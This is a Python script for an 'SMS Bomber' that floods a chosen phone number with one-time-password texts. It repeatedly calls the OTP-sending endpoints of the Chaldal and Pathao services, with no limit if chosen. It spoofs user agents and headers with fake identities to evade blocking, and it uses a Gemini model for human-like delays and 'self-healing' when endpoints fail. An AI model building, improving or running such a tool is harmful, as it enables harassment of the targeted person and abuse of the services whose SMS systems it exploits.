import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
import time
from datetime import datetime
from urllib.parse import urlparse
from faker import Faker
from collections import deque

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# Dynamic User-Agent Generator Engine
def generate_dynamic_ua():
    """Generates a highly detailed, unique, and realistic User-Agent."""
    platforms = ['Windows', 'Android', 'iOS']
    platform = random.choice(platforms)
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    webkit_v = "537.36"
    
    if platform == 'Windows':
        win_v = random.choice(['10.0', '11.0'])
        return f"Mozilla/5.0 (Windows NT {win_v}; Win64; x64) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    elif platform == 'Android':
        android_v = random.randint(13, 15)
        model = random.choice(['SM-S938B', 'Pixel 9 Pro XL', 'Xiaomi 15 Pro'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}"
    else:
        ios_v = random.choice(['17_4_1', '18_1'])
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {G}           Deep Gen AI Integration (Self-Healing)            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

# --- Data Management ---
DATA_FILE = "bomber_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except: pass
    return {"saved_numbers": {}, "settings": {"ai_enabled": True, "stealth_mode": False}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def save_number(name, number):
    data = load_data()
    data["saved_numbers"][name] = number
    save_data(data)
    logging.info(f"{G}[✓] Number saved successfully!{W}")

def list_saved_numbers():
    data = load_data()
    numbers = data.get("saved_numbers", {})
    if not numbers:
        print(f"{R}[!] No saved numbers found.{W}")
        input(f"\n{C}Press Enter to return...{W}")
        return None
    print(f"\n{Y}--- Saved Numbers ---{W}")
    keys = list(numbers.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}: {numbers[name]}{W}")
    choice = input(f"\n{Y}[?] Select a number (or 'b' to go back): {W}")
    if choice.lower() == 'b': return None
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(keys): return numbers[keys[idx]]
    except: pass
    return None

# --- Deep Gen AI Controller (Direct API Calls) ---
class GenAIController:
    """
    Deeply integrated Gen AI using direct Gemini API calls.
    Features: Self-Healing, Smart Pattern, Batching, and Dynamic Throttling.
    """
    def __init__(self):
        self.data = load_data()
        self.enabled = self.data["settings"].get("ai_enabled", True)
        self.api_key = os.getenv("GEMINI_API_KEY")
        self.fake = Faker(['en_US', 'bn_BD'])
        self.identity_queue = deque()
        self.delay_queue = deque()
        self.api_stats = {}
        self.gemini_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={self.api_key}"

    async def call_gemini(self, prompt, retries=3):
        """Direct Asynchronous API call to Gemini with Exponential Backoff."""
        if not self.api_key or not self.enabled: return None
        
        payload = {"contents": [{"parts": [{"text": prompt}]}]}
        async with aiohttp.ClientSession() as session:
            for i in range(retries):
                try:
                    async with session.post(self.gemini_url, json=payload, timeout=15) as resp:
                        if resp.status == 200:
                            result = await resp.json()
                            return result['candidates'][0]['content']['parts'][0]['text']
                        elif resp.status == 429:
                            wait_time = (2 ** i) + random.random()
                            logging.warning(f"{Y}[AI] Rate limited. Retrying in {wait_time:.2f}s...{W}")
                            await asyncio.sleep(wait_time)
                        else:
                            logging.error(f"{R}[AI] Gemini API Error: {resp.status}{W}")
                            break
                except Exception as e:
                    logging.error(f"{R}[AI] Connection Error: {e}{W}")
                    break
        return None

    async def pre_generate_data(self, count=50):
        """Pre-generate identities and delays using AI logic & Faker."""
        if not self.enabled: return
        logging.info(f"{Y}[AI] Initializing Deep AI Optimization & Batching...{W}")
        
        # Batching: Get smart delay patterns from AI
        prompt = "Generate a list of 20 realistic human-like delays (in seconds) for clicking buttons on a website. Format: comma separated numbers only."
        ai_delays = await self.call_gemini(prompt)
        if ai_delays:
            try:
                delays = [float(d.strip()) for d in ai_delays.split(',')]
                self.delay_queue.extend(delays)
            except: pass

        # Identity Batching using Faker (Optimized)
        for _ in range(count):
            name = self.fake.name()
            self.identity_queue.append({
                "name": name,
                "email": f"{name.lower().replace(' ', '.')}{random.randint(10, 999)}@{random.choice(['gmail.com', 'yahoo.com'])}",
                "user_agent": generate_dynamic_ua()
            })

    def get_smart_identity(self):
        if self.identity_queue: return self.identity_queue.popleft()
        return {"name": self.fake.name(), "email": self.fake.email(), "user_agent": generate_dynamic_ua()}

    def get_dynamic_delay(self, api_name=None):
        if self.delay_queue: return self.delay_queue.popleft()
        return random.uniform(1.5, 3.5)

    async def self_heal(self, api_name, url, error_context):
        """Self-Healing: AI analyzes failure and suggests fixes."""
        if not self.enabled: return
        logging.info(f"{P}[AI] Self-Healing triggered for {api_name}...{W}")
        prompt = f"The API {api_name} at {url} failed with error: {error_context}. Suggest if the endpoint or payload structure might have changed based on common patterns."
        suggestion = await self.call_gemini(prompt)
        if suggestion:
            logging.info(f"{G}[AI] Healing Suggestion: {suggestion[:100]}...{W}")

    def update_stats(self, api_name, success):
        if api_name not in self.api_stats:
            self.api_stats[api_name] = {"success": 0, "fail": 0, "consecutive_fails": 0}
        if success:
            self.api_stats[api_name]["success"] += 1
            self.api_stats[api_name]["consecutive_fails"] = 0
        else:
            self.api_stats[api_name]["fail"] += 1
            self.api_stats[api_name]["consecutive_fails"] += 1

# --- Bomber Engine ---
class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event or asyncio.Event()
        self.session = None
        self.semaphore = asyncio.Semaphore(10)
        self.ai = GenAIController()

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        await self.ai.pre_generate_data(100)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()
        self.ai.identity_queue.clear()
        self.ai.delay_queue.clear()

    def get_headers(self, url=None):
        identity = self.ai.get_smart_identity()
        headers = {
            "User-Agent": identity["user_agent"],
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json"
        }
        if url:
            parsed = urlparse(url)
            headers["Origin"] = f"{parsed.scheme}://{parsed.netloc}"
            headers["Referer"] = headers["Origin"] + "/"
        return headers

    async def log_event(self, api_name, success, url=None, error=None):
        self.ai.update_stats(api_name, success)
        timestamp = datetime.now().strftime("%H:%M:%S")
        if success:
            self.sent += 1
            color, icon = G, "✓"
        else:
            self.failed += 1
            color, icon = R, "✗"
            if self.ai.api_stats[api_name]["consecutive_fails"] >= 3:
                await self.ai.self_heal(api_name, url, error)
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:20} | Sent: {self.sent}{W}")

    # --- APIs ---
    async def api_chaldal(self):
        url = "https://chaldal.com/api/customer/SendOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": self.target}, headers=self.get_headers(url), timeout=10) as res:
                await self.log_event("Chaldal", res.status in [200, 201], url)
        except Exception as e: await self.log_event("Chaldal", False, url, str(e))

    async def api_pathao(self):
        url = "https://api.pathao.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": self.target}, headers=self.get_headers(url), timeout=10) as res:
                await self.log_event("Pathao", res.status in [200, 201], url)
        except Exception as e: await self.log_event("Pathao", False, url, str(e))

    async def bomb_task(self):
        apis = [self.api_chaldal, self.api_pathao]
        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit: break
            api = random.choice(apis)
            async def run_api(api_func):
                async with self.semaphore:
                    await asyncio.sleep(self.ai.get_dynamic_delay())
                    await api_func()
            asyncio.create_task(run_api(api))
            await asyncio.sleep(self.ai.get_dynamic_delay() * 0.4)

async def settings_menu():
    while True:
        clear(); banner()
        data = load_data(); settings = data["settings"]
        print(f"{Y}--- Settings & AI Control ---{W}")
        print(f"{C}[1] Deep AI Optimization: {'ON' if settings['ai_enabled'] else 'OFF'}")
        print(f"{C}[2] Stealth Mode: {'ON' if settings['stealth_mode'] else 'OFF'}")
        print(f"{C}[B] Back")
        choice = input(f"\n{Y}[?] Choice: {W}").lower()
        if choice == '1': settings['ai_enabled'] = not settings['ai_enabled']
        elif choice == '2': settings['stealth_mode'] = not settings['stealth_mode']
        elif choice == 'b': break
        data["settings"] = settings; save_data(data)

async def main():
    while True:
        clear(); banner()
        print(f"{C}[1] SMS Bombing\n[2] Saved Numbers\n[3] Settings\n[E] Exit")
        choice = input(f"\n{Y}[?] Select: {W}").lower()
        if choice == 'e': break
        elif choice == '1':
            target = input(f"{C}[?] Target: {W}")
            if len(target) == 11:
                if input(f"{C}[?] Save? (y/n): {W}").lower() == 'y':
                    save_number(input(f"{C}[?] Name: {W}"), target)
                limit = int(input(f"{C}[?] Limit (0=inf): {W}") or 0)
                async with AsyncBomber(target, limit) as bomber:
                    await bomber.bomb_task()
                    input(f"\n{G}[✓] Bombing Finished. Press Enter...{W}")
        elif choice == '2':
            target = list_saved_numbers()
            if target:
                async with AsyncBomber(target, 0) as bomber:
                    await bomber.bomb_task()
                    input(f"\n{G}[✓] Bombing Finished. Press Enter...{W}")
        elif choice == '3': await settings_menu()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
